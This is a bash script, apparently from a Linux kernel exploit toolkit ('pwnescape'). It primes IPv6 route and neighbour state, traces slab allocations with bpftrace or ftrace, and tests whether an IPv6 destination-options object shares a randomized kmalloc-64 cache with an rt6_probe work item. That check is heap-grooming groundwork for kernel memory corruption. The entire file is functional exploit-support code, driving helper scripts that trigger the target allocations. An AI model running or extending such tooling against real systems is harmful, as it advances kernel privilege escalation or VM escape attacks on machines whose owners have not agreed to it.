#!/bin/bash
# r7_gate.sh v4 -- TWO-SITE live eligibility gate.
#   site A (failed neighbour): rt6_probe kmalloc site kmrel=0x2af
#   site B (no neighbour):     rt6_probe kmalloc site kmrel=0x1ec
# ELIGIBLE iff the live dopt cache matches either live work cache.
set -u
T=/opt/pwnescape/tools
SP=$(( (RANDOM % 800) + 57500 ))
G=$(( 0x7c00 + (RANDOM % 150) ))
H=$(printf '%x' $G)
G2=$(( G + 0x200 ))
H2=$(printf '%x' $G2)
LOG=/tmp/r7gate.log
: > $LOG

idxname() {
  case "$1" in
    kmalloc-64) echo 0;;
    kmalloc-rnd-*-64)
      n=$(printf '%s' "$1" | sed -E 's/^kmalloc-rnd-0*([0-9]+)-64$/\1/')
      if [ -z "$n" ]; then echo "?"; else echo $((10#$n)); fi;;
    *) echo "?";;
  esac
}

for i in all default virbr-pwn; do sysctl -w net.ipv6.conf.$i.disable_ipv6=0 >/dev/null 2>&1; done
ip -6 addr add fd00:1::1/64 dev virbr-pwn nodad 2>/dev/null
sysctl -w net.ipv6.conf.all.forwarding=0 >/dev/null 2>&1
sysctl -w net.ipv6.conf.virbr-pwn.router_probe_interval=10 >/dev/null 2>&1
sysctl -w net.ipv6.neigh.default.gc_thresh1=100000 >/dev/null 2>&1
sysctl -w net.ipv6.neigh.default.gc_thresh2=200000 >/dev/null 2>&1
sysctl -w net.ipv6.neigh.default.gc_thresh3=300000 >/dev/null 2>&1
# site A: route + FAILED neighbour
ip -6 route replace fd01:0:$H::/64 via fe80::$H dev virbr-pwn 2>/dev/null
ip -6 neigh replace fe80::$H lladdr 02:00:00:00:00:$(printf '%02x' $((G & 0xff))) dev virbr-pwn nud failed 2>/dev/null
# site B: route only, no neighbour
ip -6 route replace fd01:0:$H2::/64 via fe80::$H2 dev virbr-pwn 2>/dev/null
ip -6 neigh del fe80::$H2 dev virbr-pwn 2>/dev/null
sleep 12
NST=$(ip -6 neigh show fe80::$H 2>/dev/null | grep -o -E 'FAILED|INCOMPLETE|STALE|DELAY|PROBE|REACHABLE' | head -1)
NST2=$(ip -6 neigh show fe80::$H2 2>/dev/null | grep -o -E 'FAILED|INCOMPLETE|STALE|DELAY|PROBE|REACHABLE' | head -1)
if [ "$NST" != "FAILED" ] || [ -n "$NST2" ]; then
  echo "RESULT observer=none dopt_live=? work_live=? verdict=OBSFAIL reason=neigh-state A=$NST B=$NST2"
  exit 2
fi
ss -K state syn-recv >/dev/null 2>&1
ss -ltn | grep -q ':7778' || { fuser -k 7778/tcp >/dev/null 2>&1; sleep 0.3; nohup python3 $T/listen_on.py >/tmp/r7lst.log 2>&1 & sleep 0.8; }
taskset -pc 7 $(pgrep -f listen_on.py) >/dev/null 2>&1

ok=0
for att in 1 2 3; do
  pkill -9 -x bpftrace 2>/dev/null; sleep 1.0
  : > $LOG
  nohup bpftrace -B none $T/r7_gateobs.bt > $LOG 2>&1 &
  BP=$!
  for i in $(seq 1 66); do grep -q Attaching $LOG 2>/dev/null && { ok=1; break; }; sleep 0.15; done
  [ "$ok" = 1 ] && break
  kill -9 $BP 2>/dev/null; sleep 0.8
done

DADDR=""; DIDX="?"; WA=""; IA="?"; WB=""; IB="?"
if [ "$ok" = 1 ]; then
  OBS=bpftrace
  python3 $T/r7_doptsyn.py $SP 1 7778 7f000002 >/dev/null 2>&1
  taskset -c 7 python3 $T/r7_up6.py $((G)) >/dev/null 2>&1      # site A (neigh branch via failed neigh)
  sleep 0.25
  taskset -c 7 python3 $T/r7_up6.py $((G2)) >/dev/null 2>&1     # site B (no neigh)
  sleep 0.5
  kill $BP 2>/dev/null; pkill -9 -x bpftrace 2>/dev/null; sleep 0.2
  DADDR=$(awk -v s=$SP '$1=="ECHO" && $3==s {print $2}' $LOG | tail -1)
  [ -z "$DADDR" ] && DADDR=$(awk '$1=="ECHO"{print $2}' $LOG | tail -1)
  if [ -n "$DADDR" ]; then
    DN=$(python3 $T/cacheid.py $DADDR 2>/dev/null | awk '{print $1}')
    DIDX=$(idxname "$DN")
    if [ "$DIDX" = "?" ]; then
      for a in $(awk '$1=="ECHO"{print $2}' $LOG | sort -u); do
        N2=$(python3 $T/cacheid.py $a 2>/dev/null | awk '{print $1}'); X2=$(idxname "$N2")
        if [ "$X2" != "?" ]; then DADDR=$a; DIDX=$X2; break; fi
      done
    fi
  fi
  while read -r rel nm wa; do
    idx=$(idxname "$nm")
    case "$rel" in
      2af) IA=$idx; WA=$wa;;
      1ec) IB=$idx; WB=$wa;;
    esac
  done < <(awk '$1=="WCHK"{rel=""; nm=""; w=""; for(i=1;i<=NF;i++){if($i ~ /^kmrel=/) rel=substr($i,7); if($i ~ /^name=/) nm=substr($i,6); if($i ~ /^work=/) w=substr($i,6)} print rel, nm, w}' $LOG)
else
  OBS=ftrace
  FT=$(bash $T/r7_ftrace.sh 2>/dev/null)
  while read -r DOPT; do
    [ -z "$DOPT" ] && continue
    OBJ=$(python3 -c "print(hex(int('$DOPT',16)-16))" 2>/dev/null)
    DN=$(python3 $T/cacheid.py $OBJ 2>/dev/null | awk '{print $1}')
    X2=$(idxname "$DN")
    if [ "$X2" != "?" ]; then DIDX=$X2; DADDR=$OBJ; break; fi
  done < <(printf '%s\n' "$FT" | awk '$1=="DOPT"{print $2}')
  while read -r WO WC WK; do
    [ -z "$WC" ] && continue
    WN=$(python3 $T/cachename.py "$WC" 2>/dev/null)
    X2=$(printf '%s' "$WN" | awk '{print $2}')
    NM=$(printf '%s' "$WN" | awk '{print $1}')
    case "${WK#0x}" in
      2af) IA=$X2; WA=$WO;;
      1ec) IB=$X2; WB=$WO;;
    esac
  done < <(printf '%s\n' "$FT" | awk '$1=="WORK"{print $2, $3, $4}')
fi

DIDX=${DIDX:-?}; IA=${IA:-?}; IB=${IB:-?}
if [ "$DIDX" = "?" ] || { [ "$IA" = "?" ] && [ "$IB" = "?" ]; }; then
  echo "RESULT observer=$OBS dopt_live=$DIDX($DADDR) workA=$IA($WA) workB=$IB($WB) verdict=OBSFAIL"
  exit 2
fi
VERD=INELIGIBLE; SITE=none
if [ "$IA" != "?" ] && [ "$((10#$DIDX))" = "$((10#$IA))" ]; then VERD=ELIGIBLE; SITE=failed-neigh; fi
if [ "$IB" != "?" ] && [ "$((10#$DIDX))" = "$((10#$IB))" ]; then VERD=ELIGIBLE; SITE=no-neigh; fi
echo "RESULT observer=$OBS dopt_live=$DIDX($DADDR) workA=$IA($WA) workB=$IB($WB) work_site=$SITE verdict=$VERD"
[ "$VERD" = "ELIGIBLE" ] && exit 0 || exit 1
